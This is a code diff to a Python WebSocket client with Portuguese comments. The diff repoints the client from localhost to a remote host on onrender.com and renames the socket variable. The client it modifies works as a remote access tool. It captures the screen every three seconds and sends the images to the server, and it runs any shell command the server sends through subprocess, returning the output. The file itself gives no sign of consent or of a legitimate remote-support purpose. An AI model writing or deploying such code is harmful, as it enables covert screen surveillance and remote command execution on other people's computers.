@@ -11,7 +11,7 @@ from PIL import Image
 import mss
 import getpass
 
-SERVER_URL = "ws://localhost:8000"
+SERVER_URL = "wss://hihat-project.onrender.com"
 
 def get_client_id():
     try:
@@ -24,7 +24,7 @@ def get_client_id():
 
 CLIENT_ID = get_client_id()
 
-def capture_screen(interval, ws):
+def capture_screen(interval, wss):
     with mss.mss() as sct:
         while True:
             try:
@@ -35,7 +35,7 @@ def capture_screen(interval, ws):
                 img.save(buffer, format="JPEG", quality=50)  # Compressão
                 encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
 
-                ws.send(json.dumps({
+                wss.send(json.dumps({
                     "type": "screen",
                     "id": CLIENT_ID,
                     "image": encoded
@@ -44,7 +44,7 @@ def capture_screen(interval, ws):
                 print("[screen error]", e)
             time.sleep(interval)
 
-def on_message(ws, message):
+def on_message(wss, message):
     try:
         data = json.loads(message)
         if data.get("command"):
@@ -55,7 +55,7 @@ def on_message(ws, message):
                 output = result.decode(errors="ignore")
             except subprocess.CalledProcessError as e:
                 output = e.output.decode(errors="ignore")
-            ws.send(json.dumps({
+            wss.send(json.dumps({
                 "type": "result",
                 "id": CLIENT_ID,
                 "output": output
@@ -63,25 +63,25 @@ def on_message(ws, message):
     except Exception as e:
         print("Erro ao processar comando:", e)
 
-def on_error(ws, error):
+def on_error(wss, error):
     print("Erro:", error)
 
-def on_close(ws, close_status_code, close_msg):
+def on_close(wss, close_status_code, close_msg):
     print("Conexão encerrada")
 
-def on_open(ws):
+def on_open(wss):
     print("Conectado ao servidor WebSocket")
-    ws.send(json.dumps({"type": "id", "id": CLIENT_ID, "role": "client",}))
-    threading.Thread(target=capture_screen, args=(3, ws), daemon=True).start()
+    wss.send(json.dumps({"type": "id", "id": CLIENT_ID, "role": "client",}))
+    threading.Thread(target=capture_screen, args=(3, wss), daemon=True).start()
 
 def main():
     websocket.enableTrace(False)
-    ws = websocket.WebSocketApp(SERVER_URL,
+    wss = websocket.WebSocketApp(SERVER_URL,
                                 on_open=on_open,
                                 on_message=on_message,
                                 on_error=on_error,
                                 on_close=on_close)
-    ws.run_forever()
+    wss.run_forever()
 
 if __name__ == "__main__":
     main()
